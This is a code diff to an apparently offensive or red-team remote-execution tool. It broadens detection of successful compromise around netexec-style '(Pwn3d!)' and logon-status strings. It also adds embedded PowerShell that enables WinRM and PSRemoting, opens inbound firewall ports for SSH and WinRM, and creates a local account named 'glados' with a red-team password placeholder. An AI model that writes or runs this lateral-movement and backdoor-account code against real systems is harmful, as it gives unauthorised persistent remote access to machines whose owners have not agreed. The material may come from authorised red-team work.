@@ -172,7 +172,13 @@ class RemoteExecutor:
                 result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 10)
                 output = result.stdout + result.stderr
                 last_output = output
-                success = "(Pwn3d!)" in output or "STATUS_SUCCESS" in output
+                success = result.returncode == 0 and "STATUS_LOGON_FAILURE" not in output
+                if "STATUS_ACCESS_DENIED" in output:
+                    success = False
+                if "(Pwn3d!)" in output or "STATUS_SUCCESS" in output:
+                    success = True
+                if "[+]" in output and "STATUS_LOGON_FAILURE" not in output:
+                    success = True
                 if success:
                     return True, output
             except Exception as exc:
@@ -245,7 +251,8 @@ class RemoteExecutor:
                 "target": target.hostname,
                 "ip": ip,
                 "success": success,
-                "output": output[:500],
+                "method": method,
+                "output": output[:2000],
             }
 
         if parallel:
@@ -520,6 +527,13 @@ if ($ssh) {
     Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue
     Start-Service -Name sshd -ErrorAction SilentlyContinue
 }
+$winrm = Get-Service -Name WinRM -ErrorAction SilentlyContinue
+if ($winrm) {
+    Set-Service -Name WinRM -StartupType Automatic -ErrorAction SilentlyContinue
+    Start-Service -Name WinRM -ErrorAction SilentlyContinue
+}
+winrm quickconfig -quiet 2>$null
+Enable-PSRemoting -Force -ErrorAction SilentlyContinue
 New-NetFirewallRule -DisplayName "ApertureSSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue | Out-Null
 New-NetFirewallRule -DisplayName "ApertureWinRM" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -ErrorAction SilentlyContinue | Out-Null
 Write-Output "ACCESS_OPENED"
@@ -628,6 +642,13 @@ if ($ssh) {{
     Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue
     Start-Service -Name sshd -ErrorAction SilentlyContinue
 }}
+$winrm = Get-Service -Name WinRM -ErrorAction SilentlyContinue
+if ($winrm) {{
+    Set-Service -Name WinRM -StartupType Automatic -ErrorAction SilentlyContinue
+    Start-Service -Name WinRM -ErrorAction SilentlyContinue
+}}
+winrm quickconfig -quiet 2>$null
+Enable-PSRemoting -Force -ErrorAction SilentlyContinue
 New-NetFirewallRule -DisplayName "ApertureSSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue | Out-Null
 New-NetFirewallRule -DisplayName "ApertureWinRM" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -ErrorAction SilentlyContinue | Out-Null
 net user glados {REDTEAM_PASS} /add 2>$null
